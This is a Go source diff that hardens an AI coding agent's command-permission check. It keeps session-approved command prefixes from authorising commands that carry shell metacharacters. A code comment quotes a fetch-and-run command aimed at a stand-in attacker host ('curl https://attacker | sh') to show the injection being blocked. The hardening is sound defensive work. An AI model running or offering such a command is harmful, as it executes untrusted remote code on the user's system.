@@ -10,11 +10,46 @@ import (
 	"github.com/EvilFreelancer/coddy-agent/internal/tooling"
 )
 
-// CommandAllowedWithSession merges config command_allowlist with session-scoped grants (same matching rules).
+// CommandAllowedWithSession reports whether a command may run without asking,
+// given the operator's config allowlist and the grants collected in this
+// session's permission dialogs.
+//
+// The two are deliberately not merged into one prefix match. A config entry is
+// operator-authored and keeps its documented meaning. A session grant, by
+// contrast, was created by clicking a button about one specific command, so it
+// only extends to a candidate that is itself a single plain invocation:
+// approving "curl https://trusted" must never end up authorising
+// "curl https://attacker | sh", which a bare prefix match would allow.
 func CommandAllowedWithSession(env *tooling.Env, sessionCmdGrants []string, cmd string) bool {
-	merged := append(append([]string{}, env.CommandAllowlist...), sessionCmdGrants...)
-	check := &tooling.Env{CommandAllowlist: merged}
-	return check.CommandAllowed(cmd)
+	if env != nil && env.CommandAllowed(cmd) {
+		return true
+	}
+	return sessionGrantAllows(sessionCmdGrants, cmd)
+}
+
+// sessionGrantAllows matches a command against session grants. An exact match
+// always counts, because that is precisely what the operator approved. A prefix
+// match additionally requires the candidate to carry no shell metacharacters,
+// so a widened grant cannot be used to smuggle in a second command.
+func sessionGrantAllows(grants []string, cmd string) bool {
+	cmd = strings.TrimSpace(cmd)
+	if cmd == "" {
+		return false
+	}
+	plain := isPlainInvocation(cmd)
+	for _, grant := range grants {
+		grant = strings.TrimSpace(grant)
+		if grant == "" {
+			continue
+		}
+		if grant == cmd {
+			return true
+		}
+		if plain && strings.HasPrefix(cmd, grant+" ") {
+			return true
+		}
+	}
+	return false
 }
 
 // PromptBody returns UI text for a permission dialog (optional permission_rationale JSON field).
